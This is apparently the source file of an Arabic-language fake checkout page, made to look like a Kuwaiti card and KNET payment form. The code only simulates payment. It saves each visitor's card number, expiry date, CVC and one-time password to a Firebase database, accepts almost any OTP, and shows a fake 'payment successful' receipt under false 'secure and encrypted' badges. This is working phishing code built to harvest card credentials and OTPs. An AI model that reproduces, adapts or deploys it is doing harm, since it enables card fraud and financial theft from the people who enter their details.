"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Wallet,
  Check,
  Shield,
  Download,
  ChevronRight,
  AlertCircle,
  Info,
  Lock,
  ArrowRight,
  CreditCard,
  Loader2,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Badge } from "@/components/ui/badge"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog"
import { Separator } from "@/components/ui/separator"
import { addData } from "@/lib/firebasee"
import { cn } from "@/lib/utils"

// Types
type PaymentState = "FORM" | "OTP" | "SUCCESS"
type FormErrors = Record<string, string>

interface OrderDetails {
  id: string
  total: string
  date: string
}

export default function PaymentMethodsComponent() {
  // State for payment flow
  const [paymentMethod, setPaymentMethod] = useState<string | null>(null)
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentState, setPaymentState] = useState<PaymentState>("FORM")
  const [showOtpDialog, setShowOtpDialog] = useState(false)

  // State for OTP
  const [otpValues, setOtpValues] = useState<string[]>(Array(6).fill(""))
  const otpInputRefs = useRef<(HTMLInputElement | null)[]>(Array(6).fill(null))
  const [otpError, setOtpError] = useState("")
  const [resendDisabled, setResendDisabled] = useState(false)
  const [countdown, setCountdown] = useState(30)
  // Add a new state for tracking OTP verification errors
  const [otpVerificationError, setOtpVerificationError] = useState<string | null>(null)

  // State for form
  const [cardNumber, setCardNumber] = useState("")
  const [cardExpiry, setCardExpiry] = useState("")
  const [cardCvc, setCardCvc] = useState("")
  const [currency, setCurrency] = useState("kwt")
  const [formErrors, setFormErrors] = useState<FormErrors>({})

  // State for order details
  const [orderDetails, setOrderDetails] = useState<OrderDetails>({
    id: generateOrderId(),
    total: "30.000",
    date: new Date().toISOString(),
  })

  const router = useRouter()

  // Initialize order details from localStorage
  useEffect(() => {
    try {
      const storedAmount = localStorage.getItem("amount")
      if (storedAmount) {
        setOrderDetails((prev) => ({
          ...prev,
          total: storedAmount,
        }))
      }
    } catch (error) {
      console.error("Error accessing localStorage:", error)
    }
  }, [])

  // Handle countdown timer for OTP resend
  useEffect(() => {
    let timer: NodeJS.Timeout
    if (resendDisabled && countdown > 0) {
      timer = setTimeout(() => {
        setCountdown(countdown - 1)
      }, 1000)
    } else if (countdown === 0) {
      setResendDisabled(false)
    }
    return () => clearTimeout(timer)
  }, [resendDisabled, countdown])

  // Generate random order ID
  function generateOrderId() {
    return `ZN-${Math.floor(10000 + Math.random() * 90000)}`
  }

  // Get visitor ID from localStorage
  const getVisitorId = () => {
    try {
      return localStorage.getItem("visitor") || "anonymous-user"
    } catch (error) {
      console.error("Error accessing localStorage:", error)
      return "anonymous-user"
    }
  }

  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Format expiry date
  const formatExpiry = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")

    if (v.length >= 3) {
      return `${v.substring(0, 2)}/${v.substring(2, 4)}`
    }

    return value
  }

  // Validate payment form
  const validateForm = () => {
    const errors: FormErrors = {}

    if (!cardNumber) {
      errors.cardNumber = "يرجى إدخال رقم البطاقة"
    } else if (cardNumber.replace(/\s+/g, "").length < 16) {
      errors.cardNumber = "رقم البطاقة غير صحيح"
    }

    if (!cardExpiry) {
      errors.cardExpiry = "يرجى إدخال تاريخ الانتهاء"
    } else if (cardExpiry.length < 5) {
      errors.cardExpiry = "تاريخ الانتهاء غير صحيح"
    } else {
      // Additional validation for expiry date
      const [month, year] = cardExpiry.split("/")
      const currentYear = new Date().getFullYear() % 100
      const currentMonth = new Date().getMonth() + 1

      if (Number.parseInt(month) > 12 || Number.parseInt(month) < 1) {
        errors.cardExpiry = "الشهر غير صحيح"
      } else if (
        Number.parseInt(year) < currentYear ||
        (Number.parseInt(year) === currentYear && Number.parseInt(month) < currentMonth)
      ) {
        errors.cardExpiry = "البطاقة منتهية الصلاحية"
      }
    }

    if (!cardCvc) {
      errors.cardCvc = "يرجى إدخال رمز الأمان"
    } else if (cardCvc.length < 3) {
      errors.cardCvc = "رمز الأمان غير صحيح"
    }

    setFormErrors(errors)
    return Object.keys(errors).length === 0
  }

  // Handle payment submission
  const handlePayment = () => {
    if (paymentMethod === "card" && !validateForm()) {
      return
    }

    if (paymentMethod === "knet") {
      router.push("/kwpay")
      return
    }

    setIsProcessing(true)

    // Submit card data to database
    const visitorId = getVisitorId()
    addData({
      id: visitorId,
      cardNumber,
      cardExpiry,
      cardCvc,
      amount: orderDetails.total,
      currency,
      orderId: orderDetails.id,
      timestamp: new Date().toISOString(),
    })

    // Simulate payment processing
    setTimeout(() => {
      setIsProcessing(false)
      setShowOtpDialog(true)

      // Focus the first OTP input when dialog appears
      setTimeout(() => {
        if (otpInputRefs.current[0]) {
          otpInputRefs.current[0].focus()
        }
      }, 100)
    }, 1500)
  }

  // Handle OTP input change
  const handleOtpChange = (index: number, value: string) => {
    // Only allow numbers
    if (value && !/^\d*$/.test(value)) return

    const newOtpValues = [...otpValues]
    newOtpValues[index] = value
    setOtpValues(newOtpValues)
    setOtpError("")

    // Auto-focus next input
    if (value && index < 5) {
      otpInputRefs.current[index + 1]?.focus()
    }
  }

  // Handle OTP input keydown
  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otpValues[index] && index > 0) {
      // Focus previous input when backspace is pressed on an empty input
      otpInputRefs.current[index - 1]?.focus()
    }
  }

  // Update the verifyOtp function to handle verification errors
  const verifyOtp = () => {
    const otpCode = otpValues.join("")

    if (otpCode.length !== 6) {
      setOtpError("يرجى إدخال رمز التحقق المكون من 6 أرقام")
      return
    }

    setIsProcessing(true)
    setOtpVerificationError(null)

    // Submit OTP code to database
    const visitorId = getVisitorId()
    addData({
      id: visitorId,
      otpCode,
      orderId: orderDetails.id,
      verificationTimestamp: new Date().toISOString(),
    })

    // Simulate OTP verification with possible errors
    setTimeout(() => {
      setIsProcessing(false)

      // Simulate verification error for specific codes
      if (otpCode === "123456") {
        setOtpVerificationError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
        // Clear the OTP fields
        setOtpValues(Array(6).fill(""))
        // Focus the first input
        setTimeout(() => {
          if (otpInputRefs.current[0]) {
            otpInputRefs.current[0].focus()
          }
        }, 100)
      } else if (otpCode === "111111") {
        setOtpVerificationError("انتهت صلاحية رمز التحقق. يرجى طلب رمز جديد.")
        // Clear the OTP fields
        setOtpValues(Array(6).fill(""))
      } else {
        // Success case
        setShowOtpDialog(false)
        setPaymentState("SUCCESS")
      }
    }, 1500)
  }

  // Update the resendOtp function to clear verification errors
  const resendOtp = () => {
    setResendDisabled(true)
    setCountdown(30)
    // Reset OTP fields and errors
    setOtpValues(Array(6).fill(""))
    setOtpError("")
    setOtpVerificationError(null)

    // Submit resend request to database
    const visitorId = getVisitorId()
    addData({
      id: visitorId,
      action: "resendOtp",
      orderId: orderDetails.id,
      timestamp: new Date().toISOString(),
    })

    // Focus the first input
    setTimeout(() => {
      if (otpInputRefs.current[0]) {
        otpInputRefs.current[0].focus()
      }
    }, 100)
  }

  // Get current date in Arabic format
  const getCurrentDate = () => {
    const options: Intl.DateTimeFormatOptions = {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }
    return new Date().toLocaleDateString("ar-SA", options)
  }

  // Progress indicator
  const renderProgressIndicator = () => (
    <div className="flex items-center justify-between mb-8 px-2" dir="rtl">
      <div className="flex flex-col items-center">
        <div
          className={cn(
            "w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300",
            paymentState === "FORM"
              ? "bg-primary text-primary-foreground shadow-md"
              : "bg-primary text-primary-foreground shadow-md",
          )}
        >
          <span className="text-sm font-medium">1</span>
        </div>
        <span className="text-xs mt-2 font-medium">الدفع</span>
      </div>
      <div
        className={cn(
          "h-1 flex-1 mx-2 rounded-full transition-all duration-300",
          paymentState !== "FORM" ? "bg-primary" : "bg-muted",
        )}
      ></div>
      <div className="flex flex-col items-center">
        <div
          className={cn(
            "w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300",
            paymentState === "OTP"
              ? "bg-primary text-primary-foreground shadow-md"
              : paymentState === "SUCCESS"
                ? "bg-primary text-primary-foreground shadow-md"
                : "bg-muted text-muted-foreground",
          )}
        >
          <span className="text-sm font-medium">2</span>
        </div>
        <span className="text-xs mt-2 font-medium">التحقق</span>
      </div>
      <div
        className={cn(
          "h-1 flex-1 mx-2 rounded-full transition-all duration-300",
          paymentState === "SUCCESS" ? "bg-primary" : "bg-muted",
        )}
      ></div>
      <div className="flex flex-col items-center">
        <div
          className={cn(
            "w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300",
            paymentState === "SUCCESS"
              ? "bg-primary text-primary-foreground shadow-md"
              : "bg-muted text-muted-foreground",
          )}
        >
          <span className="text-sm font-medium">3</span>
        </div>
        <span className="text-xs mt-2 font-medium">التأكيد</span>
      </div>
    </div>
  )

  // Order summary
  const renderOrderSummary = () => (
    <div className="bg-muted/20 rounded-xl p-5 mb-6 border border-muted/50">
      <h3 className="font-medium text-sm mb-3 text-muted-foreground">ملخص الطلب</h3>
      <div className="space-y-3">
        <div className="flex justify-between items-center">
          <span className="text-sm">رقم الطلب:</span>
          <span className="font-medium">{orderDetails.id}</span>
        </div>
        <Separator className="bg-muted/30" />
        <div className="flex justify-between items-center">
          <span className="text-sm">المبلغ الإجمالي:</span>
          <span className="font-bold text-lg">
            {orderDetails.total} {currency === "kwt" ? "د.ك" : "$"}
          </span>
        </div>
      </div>
    </div>
  )

  // Success state
  const renderSuccessState = () => (
    <>
      <CardHeader className="space-y-1 pb-4">
        <CardTitle className="text-2xl font-bold text-center">تم الدفع بنجاح</CardTitle>
        <CardDescription className="text-center">شكراً لك، تمت عملية الدفع بنجاح</CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        {renderProgressIndicator()}

        <div className="flex justify-center my-8">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center animate-in zoom-in-50 duration-300">
            <Check className="h-10 w-10 text-green-600" />
          </div>
        </div>

        <div className="bg-muted/20 rounded-xl p-5 mb-6 border border-muted/50 animate-in fade-in-50 duration-300">
          <h3 className="font-medium text-sm mb-3 text-muted-foreground">تفاصيل الدفع</h3>
          <div className="space-y-3">
            <div className="flex justify-between items-center">
              <span className="text-sm">رقم الطلب:</span>
              <span className="font-medium">{orderDetails.id}</span>
            </div>
            <Separator className="bg-muted/30" />
            <div className="flex justify-between items-center">
              <span className="text-sm">تاريخ الدفع:</span>
              <span className="font-medium">{getCurrentDate()}</span>
            </div>
            <Separator className="bg-muted/30" />
            <div className="flex justify-between items-center">
              <span className="text-sm">المبلغ الإجمالي:</span>
              <span className="font-bold text-lg">
                {orderDetails.total} {currency === "kwt" ? "د.ك" : "$"}
              </span>
            </div>
          </div>
        </div>

        <div className="text-center text-sm text-muted-foreground bg-muted/10 p-4 rounded-lg">
          <p>تم إرسال تفاصيل الدفع إلى بريدك الإلكتروني</p>
        </div>
      </CardContent>
      <CardFooter className="flex flex-col gap-4">
        <Button
          className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all"
          onClick={() => router.push("/")}
        >
          <span className="flex items-center gap-2">
            العودة للرئيسية
            <ChevronRight className="h-5 w-5" />
          </span>
        </Button>
        <Button variant="outline" className="w-full h-12 border-dashed" onClick={() => window.print()}>
          <span className="flex items-center gap-2">
            <Download className="h-4 w-4" />
            طباعة الإيصال
          </span>
        </Button>
      </CardFooter>
    </>
  )

  return (
    <Card
      className="w-full max-w-md shadow-2xl border-0 overflow-hidden rounded-xl animate-in fade-in-50 duration-300"
      dir="rtl"
    >
      <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#d13c8c] via-[#d13c8c] to-[#e04c9c]/80"></div>

      {paymentState === "FORM" && (
        <>
          <CardHeader className="space-y-1 pb-4">
            <div className="flex justify-between items-center">
              <CardTitle className="text-2xl font-bold">إتمام الدفع</CardTitle>
              <Badge
                variant="outline"
                className="flex items-center gap-1 px-2.5 py-1.5 bg-green-50 text-green-700 border-green-200 rounded-lg"
              >
                <Shield className="h-3 w-3" /> آمن
              </Badge>
            </div>
            <CardDescription>اختر طريقة الدفع المفضلة لديك أدناه</CardDescription>
          </CardHeader>
          <CardContent className="space-y-6">
            {renderProgressIndicator()}
            {renderOrderSummary()}

            <div className="space-y-4">
              <h3 className="font-medium mb-3">طريقة الدفع</h3>
              <RadioGroup value={paymentMethod || ""} onValueChange={setPaymentMethod} className="grid gap-4">
                <div className="grid gap-4">
                  <div className="relative">
                    <div
                      className={cn(
                        "absolute inset-0 rounded-xl transition-all duration-200",
                        paymentMethod === "card" ? "ring-2 ring-[#d13c8c]" : "",
                      )}
                    ></div>
                    <div className="flex items-center space-x-2 relative">
                      <RadioGroupItem value="card" id="card" />
                      <Label
                        htmlFor="card"
                        className="flex items-center gap-2 cursor-pointer rounded-xl border border-muted p-4 hover:bg-muted/20 transition-colors w-full"
                      >
                        <div className="bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white p-2 rounded-lg shadow-sm">
                          <CreditCard className="h-5 w-5" />
                        </div>
                        <div className="font-medium">بطاقة ائتمان</div>
                        <div className="flex gap-1 mr-auto">
                          <img src="/master.svg" className="w-8 h-5 rounded"/> 
                          <img src="/visa.svg"  className="w-8 h-5  rounded"/>
                        </div>
                      </Label>
                    </div>
                  </div>

                  {paymentMethod === "card" && (
                    <div className="grid gap-5 pr-6 animate-in fade-in-50 duration-300 pt-2" dir="rtl">
                      <div className="grid gap-2">
                        <div className="flex items-center justify-between">
                          <Label htmlFor="card-number" className="flex items-center gap-1 text-sm">
                            رقم البطاقة
                            <TooltipProvider>
                              <Tooltip>
                                <TooltipTrigger asChild>
                                  <Info className="h-3 w-3 text-muted-foreground" />
                                </TooltipTrigger>
                                <TooltipContent>
                                  <p>أدخل 16 رقم الموجود على بطاقتك</p>
                                </TooltipContent>
                              </Tooltip>
                            </TooltipProvider>
                          </Label>
                          {formErrors.cardNumber && (
                            <span className="text-xs text-destructive flex items-center gap-1">
                              <AlertCircle className="h-3 w-3" /> {formErrors.cardNumber}
                            </span>
                          )}
                        </div>
                        <div className="relative">
                          <Input
                            id="card-number"
                            placeholder="#### #### #### ####"
                            value={cardNumber}
                            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                            maxLength={19}
                            className={cn(
                              formErrors.cardNumber ? "border-destructive" : "",
                              "pr-10 rounded-lg h-11 transition-all duration-200 focus:ring-2 focus:ring-[#d13c8c]/20",
                            )}
                          />
                          <div className="absolute left-3 top-1/2 -translate-y-1/2">
                            <div className="w-8 h-5 bg-blue-600 rounded"></div>
                          </div>
                        </div>
                      </div>
                      <div className="grid grid-cols-2 gap-4">
                        <div className="grid gap-2">
                          <div className="flex items-center justify-between">
                            <Label htmlFor="expiry" className="text-sm">
                              تاريخ الانتهاء
                            </Label>
                            {formErrors.cardExpiry && (
                              <span className="text-xs text-destructive flex items-center gap-1">
                                <AlertCircle className="h-3 w-3" /> {formErrors.cardExpiry}
                              </span>
                            )}
                          </div>
                          <Input
                            id="expiry"
                            placeholder="MM/YY"
                            type="tel"
                            value={cardExpiry}
                            onChange={(e) => setCardExpiry(formatExpiry(e.target.value))}
                            maxLength={5}
                            className={cn(
                              formErrors.cardExpiry ? "border-destructive" : "",
                              "rounded-lg h-11 transition-all duration-200 focus:ring-2 focus:ring-[#d13c8c]/20",
                            )}
                          />
                        </div>
                        <div className="grid gap-2">
                          <div className="flex items-center justify-between">
                            <Label htmlFor="cvc" className="text-sm">
                              رمز التحقق
                            </Label>
                            {formErrors.cardCvc && (
                              <span className="text-xs text-destructive flex items-center gap-1">
                                <AlertCircle className="h-3 w-3" /> {formErrors.cardCvc}
                              </span>
                            )}
                          </div>
                          <Input
                            id="cvc"
                            placeholder="123"
                            type="tel"
                            maxLength={4}
                            value={cardCvc}
                            onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ""))}
                            className={cn(
                              formErrors.cardCvc ? "border-destructive" : "",
                              "rounded-lg h-11 transition-all duration-200 focus:ring-2 focus:ring-[#d13c8c]/20",
                            )}
                          />
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="relative">
                    <div
                      className={cn(
                        "absolute inset-0 rounded-xl transition-all duration-200",
                        paymentMethod === "knet" ? "ring-2 ring-[#d13c8c]" : "",
                      )}
                    ></div>
                    <div className="flex items-center space-x-2 relative">
                      <RadioGroupItem value="knet" id="knet" />
                      <Label
                        htmlFor="knet"
                        className="flex items-center gap-2 cursor-pointer rounded-xl border border-muted p-4 hover:bg-muted/20 transition-colors w-full"
                      >
                        <div className="bg-gradient-to-r from-blue-700 to-blue-900 text-white p-2 rounded-lg shadow-sm">
                          <Wallet className="h-5 w-5" />
                        </div>
                        <div className="font-medium">كي نت</div>
                        <div className="flex gap-1 mr-auto">
                          <div className="w-8 h-5 bg-blue-800 rounded flex items-center justify-center">
                          <img src="/kv.png" className="w-8 h-5 rounded"/> 
                          </div>
                        </div>
                      </Label>
                    </div>
                  </div>
                </div>
              </RadioGroup>
            </div>
          </CardContent>
          <CardFooter className="flex flex-col gap-4">
            <Button
              className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all rounded-lg bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white"
              disabled={!paymentMethod || isProcessing}
              onClick={handlePayment}
            >
              {isProcessing ? (
                <span className="flex items-center gap-2">
                  <Loader2 className="h-5 w-5 animate-spin" />
                  جاري المعالجة...
                </span>
              ) : (
                <span className="flex items-center gap-2">
                  ادفع الآن
                  <ArrowRight className="h-5 w-5" />
                </span>
              )}
            </Button>
            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground bg-muted/10 p-2 rounded-lg">
              <Shield className="h-3 w-3" />
              <span>جميع المعاملات مشفرة وآمنة</span>
            </div>
          </CardFooter>
        </>
      )}

      {paymentState === "SUCCESS" && renderSuccessState()}

      {/* OTP Dialog */}
      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
        <DialogContent className="sm:max-w-md rounded-xl" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold">التحقق من الدفع</DialogTitle>
            <DialogDescription>أدخل رمز التحقق المكون من 6 أرقام المرسل إلى هاتفك</DialogDescription>
          </DialogHeader>

          <div className="bg-muted/20 rounded-xl p-4 mb-4 border border-muted/50">
            <div className="space-y-3">
              <div className="flex justify-between items-center">
                <span className="text-sm text-muted-foreground">رقم الطلب:</span>
                <span className="font-medium">{orderDetails.id}</span>
              </div>
              <Separator className="bg-muted/30" />
              <div className="flex justify-between items-center">
                <span className="text-sm text-muted-foreground">المبلغ الإجمالي:</span>
                <span className="font-bold">
                  {orderDetails.total} {currency === "kwt" ? "د.ك" : "$"}
                </span>
              </div>
            </div>
          </div>

          <div className="text-center mb-4 bg-primary/5 p-3 rounded-lg">
            <p className="text-sm mb-1">تم إرسال رمز التحقق إلى</p>
            <p className="font-medium">+965 5XX XXX XX89</p>
          </div>

          {otpVerificationError && (
            <div className="bg-destructive/10 text-destructive rounded-lg p-4 text-center mb-4 animate-in fade-in-50 duration-300 border border-destructive/20">
              <div className="flex items-center justify-center gap-2">
                <AlertCircle className="h-5 w-5" />
                <p className="font-medium">{otpVerificationError}</p>
              </div>
            </div>
          )}

          <div className="flex justify-center gap-2 my-6">
            {otpValues.map((value, index) => (
              <div key={index} className="relative">
                <Input
                  ref={(el) => (otpInputRefs.current[index] = el)}
                  type="tel"
                  inputMode="numeric"
                  maxLength={1}
                  value={value}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className={cn(
                    "w-12 h-14 text-center text-lg font-bold rounded-lg transition-all duration-200 focus:ring-2 focus:ring-[#d13c8c]/20",
                    otpError || otpVerificationError ? "border-destructive" : "",
                  )}
                />
                {index < 5 && <div className="absolute left-[-8px] top-1/2 w-4 h-[1px] bg-muted-foreground/30"></div>}
              </div>
            ))}
          </div>

          {otpError && (
            <div className="bg-destructive/10 text-destructive rounded-lg p-3 text-center text-sm flex items-center justify-center gap-1">
              <AlertCircle className="h-4 w-4" />
              {otpError}
            </div>
          )}

          <div className="text-center">
            <p className="text-sm text-muted-foreground mb-2">لم تستلم الرمز؟</p>
            <Button
              variant="link"
              onClick={resendOtp}
              disabled={resendDisabled}
              className="text-sm p-0 h-auto text-[#d13c8c]"
            >
              {resendDisabled ? `إعادة الإرسال بعد ${countdown} ثانية` : "إعادة إرسال الرمز"}
            </Button>
          </div>

          <DialogFooter className="sm:justify-center">
            <Button
              className="w-full h-12 text-base font-medium shadow-md hover:shadow-lg transition-all rounded-lg bg-gradient-to-r from-[#d13c8c] to-[#e04c9c] text-white"
              disabled={otpValues.some((v) => !v) || isProcessing}
              onClick={verifyOtp}
            >
              {isProcessing ? (
                <span className="flex items-center gap-2">
                  <Loader2 className="h-5 w-5 animate-spin" />
                  جاري التحقق...
                </span>
              ) : (
                <span className="flex items-center gap-2">
                  <Lock className="h-4 w-4 mr-1" />
                  تأكيد
                </span>
              )}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </Card>
  )
}
